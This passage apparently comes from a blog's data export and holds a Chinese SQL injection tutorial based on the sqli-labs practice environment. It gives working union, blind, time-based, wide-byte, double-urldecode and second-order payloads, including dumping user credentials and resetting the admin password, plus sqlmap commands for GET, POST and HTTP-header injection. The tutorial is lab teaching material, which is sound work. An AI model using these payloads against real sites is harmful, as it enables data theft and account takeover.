Refer\n\n后台SQL语句中使用了HTTP头中的`Refer`字段中的数据\n\n```\nsqlmap > py sqlmap.py -u “url” --dbs --level=3\n```\n\n### Host\n\n后台SQL语句中使用了HTTP头中的`host`字段中的数据\n\n```\nsqlmap > py sqlmap.py -u “url” --dbs --level=5\n```\n\n以上几种注入漏洞的执行原理非常“普通”，只不过注入点位置特殊而已，熟练运用sqlmap工具即可轻松解决\n\n## POST注入\n\n上面的http头注入其实就是一种稍微特殊的post注入，**post注入**，顾名思义，就是注入点在post表单里的sql注入漏洞，一般手工注入需要借助工具（Burpsuite）抓包，然后修改post数据。\n\n利用sqlmap进行post注入有几种方式\n\n**1.普通的表单注入**\n\n在表单中，例如登陆页面，如果不知道哪个参数存在注入点，可以直接添加`--forms`命令参数\n\n```\nsqlmap > py sqlmap.py -u “url” --forms --batch\n```\n\n**2.带参数的表单注入**\n\n如果已知某个参数有注入漏洞，如\"id=1&time=2001\"\n\n```\nsqlmap > py sqlmap.py -u “url” --data “id=1&time=2001” --batch\n```\n\n**3.使用文件指定参数的表单（HTTP头）注入**\n\n比如已知注入点为id，在post表单中\n\n用Burpsuite抓包，把报头保存为`post.txt`，放在sqlmap同目录下（或者随便放哪，到时候带路径就行，懂得都懂）\n\n```\nsqlmap > py sqlmap.py -r post.txt -p id --dbs --batch \t//用-p参数指定注入点\n或者\nsqlmap > py sqlmap.py -r post.txt --level=3 --batch \t//指定探测级别，level 3级别就会自动探测http头\n```\n\n要在http头中进行注入，只要在需要探测的字段后面添加一个`*`号，sqlmap就会自动对其进行探测了，如Referer注入就在Referer字段后面添加一个`*`号。\n\n```\nReferer: http://127.0.0.1/sqli/Less-19/*\n```\n\n**4.使用Burpsuite带sqlmap插件注入**\n\n很简单，bp上配置好sqlmap插件后，右键，发送到sqlmap，然后流程和上面差不多，添加*号，或者指定参数。\n\n## GET报错注入\n\n\n\n","slug":"2021-1-16-SQL手工注入","published":1,"updated":"2021-02-01T12:49:02.888Z","comments":1,"photos":[],"link":"","_id":"ckkntx9ko002sxov7aq6zosv0","content":"<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令的 web攻击方式。权限大时可写入webshell，后门，系统命令执行，权限小时可通过注入获得系统敏感信息（管理员账号密码，重要数据等），修改数据库信息。</p>\n<blockquote>\n<p>按照注入点类型来分类</p>\n</blockquote>\n<h3 id=\"（1）数字型注入点\"><a href=\"#（1）数字型注入点\" class=\"headerlink\" title=\"（1）数字型注入点\"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href=\"http://xxx.com/users.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p>\n<p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>\n<h3 id=\"（2）字符型注入点\"><a href=\"#（2）字符型注入点\" class=\"headerlink\" title=\"（2）字符型注入点\"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href=\"http://xxx.com/users.php?name=admin\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p>\n<p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p>\n<h3 id=\"（3）搜索型注入点\"><a href=\"#（3）搜索型注入点\" class=\"headerlink\" title=\"（3）搜索型注入点\"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>\"keyword=关键字\"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p>\n<p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p>\n<blockquote>\n<p>按照数据提交的方式来分类</p>\n</blockquote>\n<h3 id=\"（1）GET-注入\"><a href=\"#（1）GET-注入\" class=\"headerlink\" title=\"（1）GET 注入\"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href=\"http://xxx.com/index.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/index.php?id=1</a> , id 是注入点。</p>\n<h3 id=\"（2）POST-注入\"><a href=\"#（2）POST-注入\" class=\"headerlink\" title=\"（2）POST 注入\"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>\n<h3 id=\"（3）Cookie-注入\"><a href=\"#（3）Cookie-注入\" class=\"headerlink\" title=\"（3）Cookie 注入\"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>\n<h3 id=\"（4）HTTP-头部注入\"><a href=\"#（4）HTTP-头部注入\" class=\"headerlink\" title=\"（4）HTTP 头部注入\"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>\n<blockquote>\n<p>按照执行效果来分类</p>\n</blockquote>\n<h3 id=\"（1）基于布尔的盲注\"><a href=\"#（1）基于布尔的盲注\" class=\"headerlink\" title=\"（1）基于布尔的盲注\"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p>\n<h3 id=\"（2）基于时间的盲注\"><a href=\"#（2）基于时间的盲注\" class=\"headerlink\" title=\"（2）基于时间的盲注\"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>\n<h3 id=\"（3）基于报错注入\"><a href=\"#（3）基于报错注入\" class=\"headerlink\" title=\"（3）基于报错注入\"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<ol>\n<li>单引号</li>\n<li>双引号</li>\n<li>基于数字型注入</li>\n</ol>\n<h3 id=\"（4）联合查询注入\"><a href=\"#（4）联合查询注入\" class=\"headerlink\" title=\"（4）联合查询注入\"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p>\n<h3 id=\"（5）堆查询注入\"><a href=\"#（5）堆查询注入\" class=\"headerlink\" title=\"（5）堆查询注入\"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p>\n<h3 id=\"（6）宽字节注入\"><a href=\"#（6）宽字节注入\" class=\"headerlink\" title=\"（6）宽字节注入\"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p>\n<h3 id=\"基于sqli-labs的实践操作\"><a href=\"#基于sqli-labs的实践操作\" class=\"headerlink\" title=\"基于sqli-labs的实践操作\"></a>基于sqli-labs的实践操作</h3><h4 id=\"1-基于报错的GET-sql注入\"><a href=\"#1-基于报错的GET-sql注入\" class=\"headerlink\" title=\"1.基于报错的GET sql注入\"></a>1.基于报错的GET sql注入</h4><h5 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h5><p><img src=\"/img/less-1.png\" alt=\"\"></p>\n<p>提示说输入一个数字作为ID的值</p>\n<p>那么先在url输入?id=1</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id=1.png\" alt=\"\"></p>\n<p>显示查询成功，返回了用户Dumb</p>\n<p>然后尝试使其报错，输入 ?id=1’</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id-1'.png\" alt=\"\"></p>\n<p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p>\n<p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p>\n<p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p>\n<p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p> id被单引号包裹，这是字符型注入点</p>\n<h5 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h5><p><img src=\"/img/less-2.png\" alt=\"\"></p>\n<p>流程与上面差不多</p>\n<p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p>\n<p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p>\n<p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id =$id limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>id没有被单引号包裹，这是一个数字型注入点</p>\n<h5 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h5><p><img src=\"/img/less-3.png\" alt=\"\"></p>\n<p>这次的报错是 ‘’1’’) LIMIT 0,1’</p>\n<p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p>\n<p>显然，后台语句是</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p>\n<p>比如上面这个less-3</p>\n<p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p>\n<p><img src=\"/img/--+.png\" alt=\"\"></p>\n<p>![](/img/– .png)</p>\n<p>都成功了，这就说明后台语句和我们想的八九不离十了</p>\n<h5 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p>\n<p>那就使用\\来制造报错，输入 id=1\\</p>\n<p>返回报错 ‘“1\\“) LIMIT 0,1’–&gt;”1\\“) LIMIT 0,1</p>\n<p>\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p>\n<p>合理推测：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>验证：</p>\n<p><img src=\"/img/less-4.png\" alt=\"\"></p>\n<p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p>\n<p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p>\n<p>例如less-1(字符型) 就可以输入?id=1’ order by 1[,2,3,4… ] –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p>\n<p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p>\n<p>我们要构造的语句是SELECT [username,password] FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p>\n<p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p>\n<p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p>\n<p>效果</p>\n<p><img src=\"/img/union%E6%B3%A8%E5%85%A5.png\" alt=\"\"></p>\n<p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p>\n<p>于是接下来注入 id=0’ union select 1,user(),database() –+</p>\n<p><img src=\"/img/union%E7%88%86%E5%BA%93.png\" alt=\"\"></p>\n<p>爆出了用户名和使用的数据库名</p>\n<p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p>\n<p>例如：</p>\n<p>爆表：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p>\n<p><img src=\"/img/union%E7%88%86%E8%A1%A8.png\" alt=\"\"></p>\n<p>看到了最后一个表是’users’,可用于下一步爆字段</p>\n<p>爆字段：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+        //记得最后这个表名要加单引号，不然没用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png\" alt=\"\"></p>\n<p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(username,0x3a,password),3 from [security.]users --+        //有时候要在表名前面加上数据库名，不然也出不来,即 这个环境下的security.<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"/img/union%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png\" alt=\"\"></p>\n<p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p>\n<h2 id=\"利用SQLmap工具进行sql注入\"><a href=\"#利用SQLmap工具进行sql注入\" class=\"headerlink\" title=\"利用SQLmap工具进行sql注入\"></a>利用SQLmap工具进行sql注入</h2><p>进入SQLmap工具目录打开命令行，输入命令</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">py sqlmap.py -u http://xxx.com/?id<span class=\"token operator\">=</span>1 --dbs --batch        //输入点为id参数 --dbs参数用于探测数据库，--batch参数用于自动执行默认选项（省的我们在探测过程中一直按Y）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>如果只有一个注入点，可以不用在url两边加上双引号，如果有两个注入点，则需要将url用双引号括起来</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">py sqlmap.py -u <span class=\"token string\">\"http://xxx.com/?id=1&amp;digree=high\"</span> --dbs --batch<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>如果需要的数据就在本数据库里，则可以省去上面这一步，直接进行接下来的爆表，爆字段的操作</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">py sqlmap.py -u http://xxx.com/?id<span class=\"token operator\">=</span>1 --tables --batch        //爆表\n假如爆出表名‘flag’<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">py sqlmap.py -u http://xxx.com/?id<span class=\"token operator\">=</span>1 -T flag --columns --batch        //爆字段\n假如爆出字段‘flag’<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">py sqlmap.py -u http://xxx.com/?id<span class=\"token operator\">=</span>1 -T flag -C flag --dump --batch        //爆出数据\n到这里就可以拿到我们想要的字段里的数据了<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h3 id=\"布尔型盲注\"><a href=\"#布尔型盲注\" class=\"headerlink\" title=\"布尔型盲注\"></a>布尔型盲注</h3><p>采用以下语句拆（猜）解字符串</p>\n<p>猜解数据库名字长度</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">?id =1' and length(database())><=N --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>猜测数据库名字。</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">?id =1' and ascii(substr(database(),1,1))><=N --+        （利用二分法，ascii为ascii码，例如97=‘a’）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<blockquote>\n<p>SUBSTR(str,pos,len): 从pos开始的位置，截取len个字符</p>\n<p>所以substr(database(),1,1)意思是截取数据库名的第一个字符，用这种方式猜解数据库的第1，2，3…到最后一个字符。</p>\n<p>SUBSTR(str,pos): pos开始的位置，一直截取到最后 </p>\n</blockquote>\n<p>6、猜表名</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">?id=1' and (ascii(substr((select table_name from  information_schema.tables where  table_schema=database()),1,1)))><=N --+）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p> 7、猜列名：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">?id=1' and (ascii(substr((select column_name from  information_schema.columns where table_schema=database() and  table_name=‘表名’ limit 0,1),1,1)))><=N --+ (如果报错可以加limit 0,1)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p> 8、查字段</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">?id=1' and length((select 列名 from 数据库.表名 limit 0,1))>0 --+\n然后重复以上猜解字符串手法<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><strong>实际上，还是直接使用sqlmap方便</strong>，直接在命令后面加 –technique B参数，则是指定进行布尔型注入（Boolen）。默认情况是BEUSTQ，即全部方式</p>\n<p> SQLMAP目前支持的注入方式包括（默认全进行）：</p>\n<blockquote>\n<p>  B: Boolean-based blind SQL injection（布尔型注入）</p>\n<p>  E: Error-based SQL injection（报错型注入）</p>\n<p>  U: UNION query SQL injection（可联合查询注入）</p>\n<p>  S: Stacked queries SQL injection（可多语句查询注入）</p>\n<p>  T: Time-based blind SQL injection（基于时间延迟注入）</p>\n<p>  Q: Inline SQL Injection (内联注入)</p>\n</blockquote>\n<h3 id=\"延时盲注\"><a href=\"#延时盲注\" class=\"headerlink\" title=\"延时盲注\"></a>延时盲注</h3><p>跟布尔盲注类似，也是猜解字符串，只不过由于前端回显更不明显，需要使用if和sleep语句来判断注入结果</p>\n<p>判断：</p>\n<pre><code>?id=1’ and sleep(5)        // 响应时间比正常情况多5秒，则存在延时注入</code></pre><p>查数据库</p>\n<pre><code>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)</code></pre><p>其他操作方式与布尔型类似。<br>例如：<br>尝试延时注入</p>\n<pre><code>?id=1’ and sleep(5) --+     //第一步,判断是否有延时注入\n?id=1' and if(length(database())&gt;&lt;=N,sleep(5),0) --+        //第二步，猜测数据库名长度\n?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0) --+     //第三步猜测数据库名</code></pre><p><strong>手工注入是不可能手工注入的，还是sqlmap省事</strong>，加参数 –technique=T，时间注入一步到位。</p>\n<h3 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h3><p>GBK编码每个字符占两字节（bytes）</p>\n<p>ASCII编码每个字符占一字节</p>\n<p><strong>重点：注入原理</strong></p>\n<p><strong>PHP中使用的编码方式为GBK，</strong></p>\n<p><strong>函数执行（参数等）使用的是ASCII编码；</strong></p>\n<p><strong>而MYSQL使用的默认字符集是GBK等宽字节字符集。</strong></p>\n<p>当后端用PHP的函数（如addslashes()、mysql_real_escape_string()、mysql_escape_string()等函数）对用户输入进行检测，对危险字符进行转义时，就有可能发生宽字节注入漏洞。</p>\n<p>当源码中设置”set character_set_client=gbk”  时</p>\n<p>%df%27 可把程序中转义函数过滤的“\\ ” （%5c）吃掉。</p>\n<blockquote>\n<p>如addslashes()函数会在用户输入的单引号 ‘ （%27）前面加一个反斜杠 \\ （%5c），但如果我们在单引号前面加一个%df，即%df%27，经过addslashes()函数过滤后就变成了 %df%5c%27 ，但是在GBK编码中，%df%5c是一个汉字 “縗”</p>\n</blockquote>\n<p>例如：</p>\n<p><code>/1.php?id=1</code>存在宽字节注入时，则: <code>/1.php?id=-1’and 1=1%23</code>,-1后面的单引号会被转义成  \\’</p>\n<p>但是提交：</p>\n<pre><code> /1.php?id=-1%df’and 1=1%23</code></pre><p> 时，</p>\n<p><code>%df</code>和 反斜杠 \\ (%5c) 组合 <code>%df%5c</code>  编码后是一个 縗 字，这时候单引号依然存在，则会闭合成功，形成宽字节注入，使得后面的and语句成功执行。</p>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><p>二次注入就是先在网站服务器里储存一些数据，这些数据可以构成恶意语法，然后再利用这些数据完成攻击，比如在该网站注册一个账号，用账号名字或密码作为payload执行注入攻击。这是最基本的原理。</p>\n<p>例如：如果有某网站的后台登录SQL语句是这样的</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT * FROM users WHERE username='$username' and password='$password'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>如果，我们先注册一个用户，用户名为”admin’ – “，且前端后端都通过了（现实场景是基本不太可能的，写题有一定可能），那么，当我们登录这个用户时，这个语句就变成了</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">SELECT * FROM users WHERE username='admin' -- ' and password='$password'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这样，就直接登录了<strong>admin</strong>账户，如果admin账户存在的话。这就是二次注入的基本原理。</p>\n<p>可以抽象概括为两步：</p>\n<p>1.插入恶意数据</p>\n<p>2.引用恶意数据</p>\n<p><strong>应用场景</strong></p>\n<p>Web应用程序常使用</p>\n<p>addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数</p>\n<p>或者开启GPC（<code>magic_quote_gpc=on</code>,<strong><em>开启之后，能自动实现addslashes()和stripslashes()这两个函数的功能</em></strong>）</p>\n<p>来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p>\n<p>二次注入适用于绕过addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数，因为这些转义函数是用在第一次输入web服务器时，执行php语句时生效的，当储存入数据库，它该是怎么样就是怎么样了</p>\n<p>比如：</p>\n<p><code>admin' --</code>这个输入，直接传入后台经过addslashes()函数过滤后，就变成了<code>admin\\' --</code>，这个嵌入sql语句是没用的，无法闭合sql语句。</p>\n<pre><code>UPDATE users SET PASSWORD='$pass' where username='admin\\' -- ' and password='$curr_pass'</code></pre><p>但是如果把它作为一个账户名注册入数据库，它在数据库里就是<code>admin' --</code>。这时我们先以这个<code>admin' --</code>账户的身份登录进去，然后修改其密码，由于这时的账户名大概率不再经过addslashes()等函数的过滤了（已经以这个账户的身份登录进去了，语句中的用户名是直接从数据库中读出或者通过session传递的），仍然是<code>admin' --</code>，也是说，后台sql语句是</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">UPDATE users SET PASSWORD='$pass' where username='admin' -- ' and password='$curr_pass'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><code>--</code>后面的语句被注释，也就是说，我们修改的是admin账户的密码。</p>\n<p><strong>sqli-labs实例分析</strong></p>\n<p><strong>less-24</strong></p>\n<p><img src=\"/img/image-20210122114946180.png\" alt=\"image-20210122114946180\"></p>\n<p>一个登录界面，有创建新用户，也有忘记密码。</p>\n<p>登录的后端源码是这样的</p>\n<p><img src=\"/img/image-20210122123420557.png\" alt=\"image-20210122123420557\"></p>\n<p>用户名密码全都用mysql_real_escape_string()函数过滤了，所以直接注入是会被转义掉单引号的</p>\n<p>我们先看看数据库中有哪些用户名</p>\n<p><img src=\"/img/image-20210122115233156.png\" alt=\"image-20210122115233156\"></p>\n<p>sqli的数据库是security,users表中有以上用户名和密码</p>\n<p>那么我们构建一个<code>admin' -- -</code>用户，新建一下</p>\n<p>看一下创建新用户的源码</p>\n<p><img src=\"/img/image-20210122115619387.png\" alt=\"image-20210122115619387\"></p>\n<p>可以看到三个输入都是用mysql_escape_string()函数过滤了的</p>\n<p>然而</p>\n<p><img src=\"/img/image-20210122124433626.png\" alt=\"image-20210122124433626\"></p>\n<p>存储到数据库中的数据就是原始数据，我们可以看到表中多了一行<code>admin' -- -</code>用户的数据</p>\n<p>现在以这个用户的身份登录</p>\n<p><img src=\"/img/image-20210122125026004.png\" alt=\"image-20210122125026004\"></p>\n<p>这里我们可以看到，它的界面上显示的用户名是<code>admin' -- -</code>，没有转义符号反斜杠<code>\\</code>，为什么呢？我们看看源码</p>\n<p><img src=\"/img/image-20210122130743856.png\" alt=\"image-20210122130743856\"></p>\n<p>它输出的是session中的”username”</p>\n<p>session中的“username”是哪来的呢？在login.php里面</p>\n<p><img src=\"/img/image-20210122131034335.png\" alt=\"login.php\"></p>\n<p>这里显示的很清楚了，$row是数据库查询结果返回的结果集列表，sqllogin()函数返回$row[1]给$login变量，$login变量再赋值给$_SESSION[“username”]，所以session中的username是从数据库中读取的，未经过安全函数过滤。</p>\n<p>然后我们来修改密码</p>\n<p><img src=\"/img/image-20210122131804080.png\" alt=\"pass-change.php\"></p>\n<p>以上是pass-change.php文件中的代码，可以看到$username由session赋值，然后用于sql语句中也就是说，此时它的sql语句实际上是</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">UPDATE users SET PASSWORD='$pass' where username='admin' -- -' and password='$curr_pass' <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><code>admin</code>用单引号闭合而且后面被注释掉了，此时我们操作的用户实际上是<code>admin</code>用户</p>\n<p>把密码改成<code>12345</code></p>\n<p><img src=\"/img/image-20210122132251979.png\" alt=\"修改成功\"></p>\n<p>再来看看数据库</p>\n<p><img src=\"/img/image-20210122132407600.png\" alt=\"admin的密码变成了12345\"></p>\n<p>第8行数据中，admin用户的密码变成了12345，sql注入成功，我们修改了admin用户的密码，可以直接登录admin账户了</p>\n<p><strong>二次urldecode 注入</strong></p>\n<p>Web应用程序通常使用</p>\n<p>addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数</p>\n<p>或者开启GPC（<code>magic_quote_gpc=on</code>,<em>开启之后，能自动实现addslshes()和stripslashes()这两个函数的功能</em>）</p>\n<p>来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p>\n<p>如果某处使用了urldecode或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入，即二次urldecode注入。</p>\n<p><strong>原理：</strong></p>\n<p>由于我们提交参数到webserver时，webserver会自动解码一次，当提交参数</p>\n<pre><code>id=1%2527</code></pre><p>经过第一次解码后，%25 解码结果为 %，则参数此时为id=1%27</p>\n<p>第二次程序使用了urldecode 或者 rawurldecode  函数来解码id参数，则解码后结果为</p>\n<pre><code>id=1'</code></pre><p>这时单引号成功出现，输入闭合，绕过了转义函数或GPC，可以在后面添加执行sql注入语句了。</p>\n<p>这个的原理类似于上面的宽字节注入</p>\n<h2 id=\"HTTP头注入\"><a href=\"#HTTP头注入\" class=\"headerlink\" title=\"HTTP头注入\"></a>HTTP头注入</h2><h3 id=\"User-agent\"><a href=\"#User-agent\" class=\"headerlink\" title=\"User-agent\"></a>User-agent</h3><p>后台SQL语句中使用了HTTP头中的<code>User-agent</code>字段中的数据</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h3><p>后台SQL语句中使用了HTTP头中<code>Cookie</code>字段中的数据</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id=\"Refer\"><a href=\"#Refer\" class=\"headerlink\" title=\"Refer\"></a>Refer</h3><p>后台SQL语句中使用了HTTP头中的<code>Refer</code>字段中的数据</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id=\"Host\"><a href=\"#Host\" class=\"headerlink\" title=\"Host\"></a>Host</h3><p>后台SQL语句中使用了HTTP头中的<code>host</code>字段中的数据</p>\n<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=5</code></pre><p>以上几种注入漏洞的执行原理非常“普通”，只不过注入点位置特殊而已，熟练运用sqlmap工具即可轻松解决</p>\n<h2 id=\"POST注入\"><a href=\"#POST注入\" class=\"headerlink\" 